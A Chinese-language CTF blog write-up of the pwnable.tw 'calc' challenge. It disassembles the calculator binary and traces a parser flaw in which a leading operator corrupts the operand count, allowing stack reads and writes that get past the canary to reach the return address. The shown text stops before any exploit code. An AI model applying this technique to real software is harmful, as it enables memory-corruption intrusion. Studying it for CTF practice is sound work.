<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="pwnable.tw_challenge_calc首先运行一下了解到这个程序大概类似计算器，计算我们输入的一个合法表达式的值载入IDA分析： 0x01 程序过程0x01 main12345678910111213141516171819push    ebpmov     ebp, espand     esp, 0FFFFFFF0hsub     esp, 10hmov     dword pt">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnable.tw_calc">
<meta property="og:url" content="http://yoursite.com/2018/06/03/pwnable-tw-calc/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="pwnable.tw_challenge_calc首先运行一下了解到这个程序大概类似计算器，计算我们输入的一个合法表达式的值载入IDA分析： 0x01 程序过程0x01 main12345678910111213141516171819push    ebpmov     ebp, espand     esp, 0FFFFFFF0hsub     esp, 10hmov     dword pt">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-5ca5627ce3ac26e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-73c54c4f8e7a913a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-d8544bc80e94eab2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2018-06-03T13:56:07.000Z">
<meta property="article:modified_time" content="2018-08-15T14:07:52.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-5ca5627ce3ac26e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>pwnable.tw_calc</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/06/04/pwnable-tw-dublesort/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/06/02/pwnable-tw-orw/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/03/pwnable-tw-calc/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&text=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&is_video=false&description=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwnable.tw_calc&body=Check out this article: http://yoursite.com/2018/06/03/pwnable-tw-calc/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&title=pwnable.tw_calc" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/03/pwnable-tw-calc/&name=pwnable.tw_calc&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-calc"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_calc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-程序过程"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 程序过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-main"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x01 main</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-calc"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x02 calc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#0x01-canary保护"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">0x01 canary保护</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x02-bzero"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">0x02 _bzero</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x03-get-expr"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">0x03 get_expr</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x04-init-pool"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">0x04  init_pool</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#0x05-parse-expr"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">0x05  parse_expr</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">0x02  漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-ROP"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 ROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-EXP"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 EXP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        pwnable.tw_calc
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-06-03T13:56:07.000Z" itemprop="datePublished">2018-06-03</time>
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/PWN/">PWN</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="pwnable-tw-challenge-calc"><a href="#pwnable-tw-challenge-calc" class="headerlink" title="pwnable.tw_challenge_calc"></a>pwnable.tw_challenge_calc</h3><p>首先运行一下<br>了解到这个程序大概类似计算器，计算我们输入的一个合法表达式的值<br>载入IDA分析：</p>
<h4 id="0x01-程序过程"><a href="#0x01-程序过程" class="headerlink" title="0x01 程序过程"></a>0x01 程序过程</h4><h5 id="0x01-main"><a href="#0x01-main" class="headerlink" title="0x01 main"></a>0x01 main</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">sub     esp, 10h</span><br><span class="line">mov     dword ptr [esp+4], offset timeout</span><br><span class="line">mov     dword ptr [esp], 0Eh</span><br><span class="line">call    ssignal</span><br><span class="line">mov     dword ptr [esp], 3Ch</span><br><span class="line">call    alarm</span><br><span class="line">mov     dword ptr [esp], offset aWelcomeToSecpr ; &quot;&#x3D;&#x3D;&#x3D; Welcome to SECPROG calculator &#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">call    puts</span><br><span class="line">mov     eax, stdout</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    fflush</span><br><span class="line">call    calc</span><br><span class="line">mov     dword ptr [esp], offset aMerryChristmas ; &quot;Merry Christmas!&quot;</span><br><span class="line">call    puts</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<p>可以看到这里关键处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用一个计时器</span><br><span class="line">调用关键函数calc</span><br></pre></td></tr></table></figure>
<h5 id="0x02-calc"><a href="#0x02-calc" class="headerlink" title="0x02 calc"></a>0x02 calc</h5><h6 id="0x01-canary保护"><a href="#0x01-canary保护" class="headerlink" title="0x01 canary保护"></a>0x01 canary保护</h6><p>可以看到函数开始：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 5B8h</span><br><span class="line">mov     eax, large gs:14h</span><br><span class="line">mov     [ebp+var_C], eax</span><br><span class="line">xor     eax, eax</span><br></pre></td></tr></table></figure>
<p>可以看到这里启用了canary保护<br>将内存large gs:14h中的(随机值)入栈<br>并在程序返回前对canary值进行检验：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nop</span><br><span class="line">mov     eax, [ebp+var_C]</span><br><span class="line">xor     eax, large gs:14h</span><br><span class="line">jz      short locret_8049432</span><br></pre></td></tr></table></figure>
<p>canary值在栈中位于返回地址和函数调用参数之间<br>从而保护了栈内数据，防止我们修改返回地址造成栈溢出</p>
<h6 id="0x02-bzero"><a href="#0x02-bzero" class="headerlink" title="0x02 _bzero"></a>0x02 _bzero</h6><p>canary入栈后calc调用了bzero：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [esp+4], 400h</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">mov     [esp], eax      ; s</span><br><span class="line">call    _bzero</span><br></pre></td></tr></table></figure>
<p>这里从ebp+s开始将一段长为0x400的空间清零</p>
<h6 id="0x03-get-expr"><a href="#0x03-get-expr" class="headerlink" title="0x03 get_expr"></a>0x03 get_expr</h6><p>开辟一段数据后<br>calc调用了get_expr函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [esp+4], 400h</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    get_expr</span><br></pre></td></tr></table></figure>
<p>跟进get_expr后发现一堆判断跳转<br>大致过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤掉除&quot;[0-9],+,-,×,&#x2F;,%&quot;外的其他字符</span><br><span class="line">读入我们输入的表达式到_bzero开辟的空间中</span><br><span class="line">当我们成功读入返回值不为0，calc跳转到loc_80493CC处：</span><br><span class="line">test    eax, eax</span><br><span class="line">jnz     short loc_80493CC</span><br></pre></td></tr></table></figure>
<h6 id="0x04-init-pool"><a href="#0x04-init-pool" class="headerlink" title="0x04  init_pool"></a>0x04  init_pool</h6><p>接下来calc调用init_pool：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_5A0]</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    init_pool</span><br></pre></td></tr></table></figure>
<p>init_pool：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:08048FF8                 push    ebp</span><br><span class="line">.text:08048FF9                 mov     ebp, esp</span><br><span class="line">.text:08048FFB                 sub     esp, 10h</span><br><span class="line">.text:08048FFE                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08049001                 mov     dword ptr [eax], 0</span><br><span class="line">.text:08049007                 mov     [ebp+var_4], 0</span><br><span class="line">.text:0804900E                 jmp     short loc_8049022</span><br><span class="line">.text:08049010 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08049010</span><br><span class="line">.text:08049010 loc_8049010:                            ; CODE XREF: init_pool+2E↓j</span><br><span class="line">.text:08049010                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08049013                 mov     edx, [ebp+var_4]</span><br><span class="line">.text:08049016                 mov     dword ptr [eax+edx*4+4], 0</span><br><span class="line">.text:0804901E                 add     [ebp+var_4], 1</span><br><span class="line">.text:08049022</span><br><span class="line">.text:08049022 loc_8049022:                            ; CODE XREF: init_pool+16↑j</span><br><span class="line">.text:08049022                 cmp     [ebp+var_4], 63h</span><br><span class="line">.text:08049026                 jle     short loc_8049010</span><br><span class="line">.text:08049028                 leave</span><br><span class="line">.text:08049029                 retn</span><br></pre></td></tr></table></figure>
<p>很简短的一个过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从ebp+var_5A0开始</span><br><span class="line">将长度为63h的空间清零</span><br></pre></td></tr></table></figure>
<h6 id="0x05-parse-expr"><a href="#0x05-parse-expr" class="headerlink" title="0x05  parse_expr"></a>0x05  parse_expr</h6><p>接下来calc调用 parse_expr函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_5A0]</span><br><span class="line">mov     [esp+4], eax</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    parse_expr</span><br></pre></td></tr></table></figure>
<p>可以看到其参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">init_pool清零的那段空间的首地址：ebp+var_5A0</span><br><span class="line">对应读入表达式的首地址：ebp+s</span><br></pre></td></tr></table></figure>
<p>首先F5分析一下parse_expr的伪代码（分析在注释处）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl parse_expr(int a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; &#x2F;&#x2F; ST2C_4</span><br><span class="line">  int v4; &#x2F;&#x2F; eax</span><br><span class="line">  int v5; &#x2F;&#x2F; [esp+20h] [ebp-88h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+24h] [ebp-84h]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+28h] [ebp-80h]</span><br><span class="line">  char *s1; &#x2F;&#x2F; [esp+30h] [ebp-78h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+34h] [ebp-74h]</span><br><span class="line">  char s[100]; &#x2F;&#x2F; [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v11; &#x2F;&#x2F; [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v11 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  v5 &#x3D; a1;</span><br><span class="line">  v7 &#x3D; 0;</span><br><span class="line">  bzero(s, 0x64u);</span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)(*(char *)(i + a1) - 48) &gt; 9 )&#x2F;&#x2F; 比对ascii并转换成unsigned int后，检验是否为运算符</span><br><span class="line">    &#123;</span><br><span class="line">      v2 &#x3D; i + a1 - v5;                         &#x2F;&#x2F; 运算符左操作数长度</span><br><span class="line">      s1 &#x3D; (char *)malloc(v2 + 1);</span><br><span class="line">      memcpy(s1, v5, v2);</span><br><span class="line">      s1[v2] &#x3D; 0;</span><br><span class="line">      if ( !strcmp(s1, &quot;0&quot;) )                   &#x2F;&#x2F; 判断运算符左边操作数是否为0</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;prevent division by zero&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 &#x3D; atoi((int)s1);                       &#x2F;&#x2F; 将读入的操作数由字符串转化为int</span><br><span class="line">      if ( v9 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 &#x3D; (*a2)++;                           &#x2F;&#x2F; a2[0]保存操作数个数</span><br><span class="line">        a2[v4 + 1] &#x3D; v9;                        &#x2F;&#x2F; 将第二个操作数存入第二次开辟的那段空间</span><br><span class="line">      &#125;</span><br><span class="line">      if ( *(_BYTE *)(i + a1) &amp;&amp; (unsigned int)(*(char *)(i + 1 + a1) - 48) &gt; 9 )&#x2F;&#x2F; 判断是否两个运算符连续</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;expression error!&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      v5 &#x3D; i + 1 + a1;                          &#x2F;&#x2F; v5指向运算符后一个字符，构造下一个循环</span><br><span class="line">      if ( s[v7] )                              &#x2F;&#x2F; 判断是否为第一个操作数（对上一个操作符进行判断）</span><br><span class="line">      &#123;</span><br><span class="line">        switch ( *(char *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          case 37:</span><br><span class="line">          case 42:</span><br><span class="line">          case 47:</span><br><span class="line">            if ( s[v7] !&#x3D; 43 &amp;&amp; s[v7] !&#x3D; 45 )   &#x2F;&#x2F; 判断运算是否为加减从而确定运算顺序</span><br><span class="line">            &#123;</span><br><span class="line">              eval(a2, s[v7]);</span><br><span class="line">              s[v7] &#x3D; *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              s[++v7] &#x3D; *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case 43:</span><br><span class="line">          case 45:</span><br><span class="line">            eval(a2, s[v7]);</span><br><span class="line">            s[v7] &#x3D; *(_BYTE *)(i + a1);</span><br><span class="line">            break;</span><br><span class="line">          default:</span><br><span class="line">            eval(a2, s[v7--]);                  &#x2F;&#x2F; 保证了最后while时运算符右边的优先级大于左边</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else                                      &#x2F;&#x2F; 若此操作符不是第一个操作符，则读入s[v7]中</span><br><span class="line">      &#123;</span><br><span class="line">        s[v7] &#x3D; *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !*(_BYTE *)(i + a1) )                &#x2F;&#x2F; 字符串结尾</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v7 &gt;&#x3D; 0 )</span><br><span class="line">    eval(a2, s[v7--]);                          &#x2F;&#x2F; 将因优先级问题没有计算的运算从右向左依次计算</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除此之外，这里调用了eval函数来进行计算：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl eval(_DWORD *a1, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; &#x2F;&#x2F; eax</span><br><span class="line"></span><br><span class="line">  if ( a2 &#x3D;&#x3D; 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] +&#x3D; a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 &#x3D;&#x3D; 45 )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] -&#x3D; a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 &#x3D;&#x3D; 47 )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] &#x2F;&#x3D; a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &#x3D;&#x3D; 42 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] *&#x3D; a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result &#x3D; a1;</span><br><span class="line">  --*a1;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init_pool中开辟的空间依次保存操作数（即calc中的：var_59C&#x3D; dword ptr -59Ch）（开始位置保存操作数个数）</span><br><span class="line">parse_expr中新开辟的空间s保存运算符</span><br><span class="line">a2[*a2]处保存表达式最终结果</span><br></pre></td></tr></table></figure>
<h4 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02  漏洞"></a>0x02  漏洞</h4><p>在parse_expr中分析：<br>正常情况下最终应该在a2[1]处的值为结果<br>可当考虑到第一个字符即为运算符的情况下：<br>例如：+10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*a2&#x3D;1(一个操作数)</span><br><span class="line">a2[1]&#x3D;10</span><br><span class="line">s[0]&#x3D;&#39;+&#39;</span><br><span class="line">a2[*a2-1]&#x3D;a2[*a2-1]+a2[*a2]</span><br><span class="line">即：a2[0]&#x3D;a2[0]+a2[1]&#x3D;11</span><br><span class="line">而后--*a2,即：*a2&#x3D;10</span><br><span class="line">最终输出结果为a2[*a2]&#x3D;a2[10]</span><br><span class="line">这里注意*a2与 init_pool中开辟的63h长度的地址是连续的，记 init_pool中地址为a3的话</span><br><span class="line">那么如果最后输出a3[*a2-1]&#x3D;a2[*a2]</span><br></pre></td></tr></table></figure>
<p>同样地：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果+10+1</span><br><span class="line">则会使：a2[10]&#x3D;a2[10]+1</span><br><span class="line">并输出a2[10]</span><br><span class="line">那么当我们选取恰当大小的操作数即可绕过canary修改返回地址，从而实现溢出</span><br></pre></td></tr></table></figure>
<p>这里注意：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每一次循环都会重新调用前面两个清零的函数，我们修改这里的数据，下一次依然会清零（不过这段地址外数据（包括我们要修改的返回地址）不会清零，可以修改）</span><br></pre></td></tr></table></figure>
<p>我们查看一下程序的保护机制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec  --file .&#x2F;calc</span><br></pre></td></tr></table></figure>
